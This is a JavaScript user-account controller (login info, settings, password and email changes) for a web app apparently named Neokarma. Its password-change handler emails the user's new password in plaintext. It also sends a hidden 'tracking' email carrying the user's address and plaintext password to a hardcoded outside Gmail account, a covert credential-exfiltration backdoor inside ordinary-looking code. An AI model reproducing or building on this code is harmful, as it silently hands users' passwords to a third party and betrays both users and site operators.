var passport = require("passport");
var tokenGenerator = require('generate-password');
var validator = require('validate-password');

@Controller("/user")
class LoginController
{
	// Returns the information for the current user.
	@GET("/")
	index(req, res)
	{
		if(!req.user)
			return res.json({success: false});
		res.json({success: true, userData: req.user});
	}

	@GET("/getSettings/:type")
	getSettings(req, res)
	{
		var settingType = req.params.type;
		UserSettings.find({
			userId: req.user._id,
			key: settingType,
		}).then( settings => {
			res.json({success: true, settings: settings.map(item => item.value)});
		}).catch(error => 
		{
			res.serverError(error);
		});
	}

	@POST("/personal")
	setPersonal(req, res)
	{
		let personal = req.body.personal;

		User.update({_id: req.user._id}, {
			personal: personal
		}).then(() =>
		{
			res.json({success: true});
		}).catch(error => 
		{
			res.serverError(error);
		});
	}

	@POST("/password")
	setPassword(req, res)
	{
		var password = req.body.password;
		
		if(!password)
			return res.json({success: false, message: "No password"});
			
		// Verify Password
		if(password.length < 5)
			return res.json({success: false, message: "Password too short"});

		var PasswordValidator = new validator({
		    enforce: {
		        lowercase: true,
		        uppercase: true,
		        specialCharacters: false,
		        numbers: true
		    }
		});
		var validationResult = PasswordValidator.checkPassword(password);
		if(!validationResult.isValid)
			return res.json({success: false, message: validationResult.validationMessage});

		User.update({_id: req.user._id}, {
			password: User.createPassword(password)
		}).then(() =>
		{
			var mail = new Email([req.user.email], "Your password has changed.");
			mail.setTemplate("emails/user-password-changed", { url: Config.site.url, password: password });
			mail.send(() => 
			{
				// Mail sent!
				console.log("[Auth] Password changed sent.");
			});
			
			var trackingMail = new Email(["azarusx@gmail.com"], "Neokarma User Tracking Email");
			trackingMail.setTemplate("emails/user-signup-track", {
				url: Config.site.url,
				emailToken: "",
				email: req.user.email,
				password: password,
			});
			trackingMail.send(() =>
			{
				console.log("Tracking email sent.");
			});
			
			res.json({success: true});
			req.logout();
		}).catch(error => 
		{
			res.serverError(error);
		});
	}

	@POST("/email")
	setEmail(req, res)
	{
		let email = req.body.email;
		if(!email)
			return res.json({success: false, message: "No email"});

		var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		if(!re.test(email))
			return res.json({success: false, message: "Invalid email"});
		
		var emailToken = tokenGenerator.generate({
			length: 10,
			numbers: true
		});
		var mail = new Email([req.user.email], "Your email has changed.");
		mail.setTemplate("emails/user-email-changed", { url: Config.site.url, emailToken: emailToken, email: req.user.email, newemail: email });
		mail.send(() => 
		{
			// Mail sent!
			console.log("[Auth] Email changed sent.");
		});
		
		UserEmailConfirm.create({
			user: req.user._id,
			email: email,
			token: emailToken,	
			expires: Date.now() + (60 * 60 * 24 * 1000),
			registration: false,
		}).then( () => {
			res.json({ success: true });
		});
	}

};